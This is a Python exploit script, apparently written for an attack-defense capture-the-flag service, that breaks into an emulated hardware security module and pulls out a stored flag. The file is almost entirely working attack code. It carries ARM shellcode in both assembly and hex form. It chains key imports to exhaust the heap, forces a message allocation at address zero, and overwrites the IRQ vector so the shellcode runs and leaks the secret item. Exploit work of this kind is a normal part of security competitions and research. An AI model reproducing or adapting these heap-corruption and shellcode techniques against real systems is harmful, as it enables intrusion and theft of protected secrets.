#!/usr/bin/env python3

import json
import struct
import sys

from hsmutil import *
from interactions import Diesi


"""
.code 32

// Running in IRQ interrupt handler context.

// Restore IRQ handler entry.
LDR R0, =0xe59ff004
MOV R1, #0x18
STR R0, [R1]

// Restore a clean heap.
LDR R0, =0x12000 // Heap start
LDR R1, =0x11a90 // Current heap end pointer
STR R0, [R1]

// Return from interrupt context.
SUBS PC, PC, #4

// Running in normal supervisor context.

// Send MSG_CS_GET.
SUB SP, SP, #16
MOV R0, SP
MOV R1, #0x23 // MSG_CS_GET
STR R1, [R0]
MOV R1, #4
STR R1, [R0, #4] // Size
LDR R1, =0x58585858
STR R1, [R0, #8] // Item ID
LDR R1, =0x10db4 // msg_send
BLX R1

// Clean UART RX by receiving until X at end of key.
clean_rx_loop:
LDR R0, =0x116c0 // uart_get_byte
BLX R0
CMP R0, #0x58 // 'X'
BNE clean_rx_loop

// Echo back the reply.
echo_loop:
LDR R1, =0x116c0 // uart_get_byte
BLX R1
LDR R1, =0x11720 // uart_put_byte
BLX R1
B echo_loop
"""


# Replace XXXX with item ID.
SHELLCODE = bytes.fromhex('60009fe51810a0e3000081e5120aa0e354109fe5000081e504f05fe210d04de20d00a0e12310a0e3001080e50410a0e3041080e534109fe5081080e530109fe531ff2fe12c009fe530ff2fe1580050e3fbffff1a1c109fe531ff2fe118109fe531ff2fe1faffffea04f09fe5901a010058585858b40d0100c016010020170100')
SHELLCODE_ADDR = 0x12ce0


def exploit(host: str, flag_id: str) -> str:
    flag_id_d = json.loads(flag_id)
    flag_item_id = int(flag_id_d['item_id'])

    shcode = SHELLCODE.replace(b'XXXX', struct.pack('<I', flag_item_id))

    # Message allocated at NULL, key starts at 0x8.
    # 0x00: LDR PC, [PC, #0] ; 0x08
    #       originally LDR PC, [PC, #24] corrupted by 0x00 message type
    # 0x04: message length (garbage)
    # --- KEY STARTS HERE ---
    # 0x08: .word SHELLCODE_ADDR
    null_key = struct.pack('<I', SHELLCODE_ADDR)
    # 0x0c: padding
    null_key += b'A'*12
    # 0x18: LDR PC, [PC, #16] ; 0x30
    #       originally LDR PC, [PC, #4]
    #       this is the IRQ entry which is triggered by UART receive
    #       usually we can corrupt just one byte before it gets called
    #       we just change the LSB (0x04 -> 0x10)
    #       word at 0x30 is zero, so jumps to 0x00 which jumps to shellcode
    null_key += struct.pack('<I', 0xe51ff010)

    assert len(shcode) <= 1024 - 60

    keys = [
        # 5 keys, ascending sizes with 12 bytes spacing to exhaust heap.
        # First key is also used to place the shellcode in the heap.
        shcode.ljust(1024 - 60, b'X'),
        b'A'*(1024 - 48),
        b'A'*(1024 - 36),
        b'A'*(1024 - 24),
        b'A'*(1024 - 12),
        # Message allocation for this key will fail.
        null_key.ljust(1023, b'Y') + b'X',
        # Target key is small to reduce holes before extract_token.
        b'A',
    ]

    key_ids = []

    # Import owner key.
    client = Diesi(host)
    client.register_checked(rand_username(), rand_password())
    key_ids.append(client.hsm_import_key(keys[0]))

    # Create item. Big to help with heap exhaustion, but not so
    # big it leaves holes that will mess with us later.
    item_id = client.hsm_import_item(b'A'*1000)

    # Import other keys and stay logged as target user.
    for key in keys[1:]:
        client = Diesi(host)
        client.register_checked(rand_username(), rand_password())
        key_ids.append(client.hsm_import_key(key))

    # Build share token.
    token = make_root_token(key_ids[0], item_id, keys[0])
    for i in range(len(keys)-1):
        token = make_share_token(key_ids[i+1], token, keys[i])
    token = finalize_token(token, keys[-1], rand_nonce())

    # Boom!
    reply = client.hsm_get_item(item_id, token)
    flag = reply[4:].decode()

    return flag


if __name__ == '__main__':
    host, flag_id = sys.argv[1:3]
    flag = exploit(host, flag_id)
    print(flag)
